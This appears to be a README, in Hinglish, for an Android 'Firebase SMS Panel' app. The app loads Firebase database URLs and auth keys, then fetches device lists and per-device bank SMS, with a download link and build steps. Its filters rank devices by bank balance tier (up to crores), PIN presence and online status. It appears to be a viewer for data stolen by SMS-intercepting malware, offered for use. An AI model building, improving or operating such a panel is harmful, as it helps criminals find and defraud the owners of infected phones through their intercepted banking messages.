# Firebase SMS Panel (standalone APK)

Virtus Panel Viewer Pro–style screen: **TXT** me Firebase panels → **Start Fetch** / **Fetch Live** → devices + bank SMS (jo **tier + PIN + connection** select ho).

## Signed APK

**Download (latest signed, v1.0.13):**  
`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.13-release-signed.apk`

**Signed** — phone pe “Install unknown apps” allow karo.

### Build locally

Keystore **GitHub pe upload mat karo** — apne PC par banao:

```bash
cd firebase-sms-panel-app
mkdir -p signing
keytool -genkeypair -v -keystore signing/release.keystore -alias firebasepanel \
  -keyalg RSA -keysize 2048 -validity 10000
cp keystore.properties.example keystore.properties
# keystore.properties me paths + passwords edit karo
./gradlew assembleRelease
```

**Output:** `app/build/outputs/apk/release/app-release.apk`

## Use (screenshot jaisa)

1. **TXT** — Virtus format: har panel **Firebase URL** + **KEY:** / **Secret:** / `token:` (same as Virtus `index.html`). Bina key ke sirf **public read** DB.
2. **Fetch Live** — turant dubara fetch (**45s auto-refresh nahi**).
3. **Start Fetch** — same; har baar **jo filter select** hai us hisaab se list + SMS.
4. **Export TXT** — filtered device list share.
5. **Metrics** — DEVICES, ONLINE, BALANCE, BANK SMS, **PHONE** = loaded panel count (TXT).
6. **Search Here** + **Online / Offline** chip (sirf do — Virtus ref jaisa).
7. **Balance band** — High 1L-20L, Boom 20L-1Cr, Medium 5K, Low→High (bank SMS + amount tier).
8. **PIN** — PIN / No PIN; dubara tap = **sab devices** (donon).
9. **SMS age** — **1d** ya **All** (baaki din options hata diye).
10. **ACTIVE** strip — tier + PIN + connection + age.
11. **Devices** — white cards; **Firebase** URL line; neeche **MSG** (credit/debit/received jaisi bank txn — amount na parse ho to bhi pass ho sakta); **card tap** → sheet.

### Virtus fetch (auth + `clients` + `messages`)

- Har request: `...json?auth=<Auth Key>`
- `clients.json` → device meta
- `messages/<deviceId>.json` → SMS (`orderBy` + `limitToLast` fast path)

## Data

- Cap ~**8000** SMS/DB. Path fix: `messages/<deviceId>/...` (device id sahi segment).

## Notes

- Agar fetch ke baad **SMS count 0** — KEY / rules check; error line app me dikhegi agar panel ne message bheja ho (`clients empty`, `403`, …).
- Agar **SMS aaye lekin devices 0** — tier tight hai → **Medium** ya **Low→High** try karo, **PIN** reset, **1d** hata ke **All**, ya **Offline** chip (data + “offline” devices).
